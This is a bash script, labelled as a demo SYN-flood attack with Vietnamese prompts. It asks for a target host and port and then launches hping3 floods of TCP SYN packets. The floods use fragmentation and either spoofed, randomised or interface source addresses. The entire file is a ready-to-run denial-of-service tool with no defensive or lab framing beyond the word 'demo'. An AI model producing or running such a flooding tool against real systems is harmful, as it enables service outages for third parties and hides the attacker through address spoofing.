#!/bin/bash

echo 'DEMO SYNFLOOD ATTACK'
echo 'Chọn đối tượng'
#need a target IP/hostname
        read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
                echo "Chọn Port (Mặc định: 80):"
        read -i $PORT -e PORT
        : ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
        if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
     PORT=80 && echo "Invalid port"
        elif [ "$PORT" -lt "1" ]; then
     PORT=80 && echo "Invalid port number chosen! Reverting port 80"
        elif [ "$PORT" -gt "65535" ]; then
     PORT=80 && echo "Invalid port chosen! Reverting to port 80"
        else echo "Sử dụng $PORT"
        fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
                echo "Nhập Source IP, [r]andom, [i]nterface IP (default):"
        read -i $SOURCE -e SOURCE
        : ${SOURCE:=i}
#should any data be sent with the SYN packet?  Default is to send no data
        echo "Gửi data bằng SYN packet? [y]es or [n]o "
        read -i $SENDDATA -e SENDDATA
        : ${SENDDATA:=n}
        if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
        echo "Nhập độ lớn:"
        read -i $DATA -e DATA
        : ${DATA:=3000}
#If not an integer is entered, use default
        if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
        DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
        fi
#if $SENDDATA is not equal to y (yes) then send no data
        else DATA=0
        fi
#start TCP SYN flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
fragmentation should therefore place more stress on the target system
        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                echo "Starting TCP SYN Flood."
                sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
        elif [ "$SOURCE" = "r" ]; then
                echo "Starting TCP SYN Flood."
                sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
        elif [ "$SOURCE" = "i" ]; then
                echo "Starting TCP SYN Flood."
                sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
        else echo "Not a valid option!"
                echo "Starting TCP SYN Flood."
                sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
        fi

